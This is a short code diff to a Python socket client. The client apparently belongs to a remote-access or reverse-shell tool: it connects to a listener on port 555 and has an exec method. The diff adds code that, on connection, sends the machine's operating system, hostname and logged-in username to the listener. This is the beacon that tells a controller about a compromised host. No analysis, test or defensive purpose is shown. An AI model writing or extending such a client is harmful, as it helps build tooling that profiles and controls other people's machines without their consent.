@@ -1,6 +1,7 @@
 import platform
 import socket
 from exec import tools
+import getpass
 
 PORT=555
 HOST="127.0.0.1"
@@ -8,12 +9,14 @@ HOST="127.0.0.1"
 class Client:
     def __init__(self):
         self.s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.connect()
-        
+        self.user = getpass.getuser()
+        self.puter=platform.node()
         self.osm=platform.system()
+        self.connect()
     
     def connect(self):
         self.s.connect((HOST,PORT))
+        self.s.send((self.osm+" "+self.puter+" "+self.user).encode())
 
     def exec(self,size):
         print(self.osm)
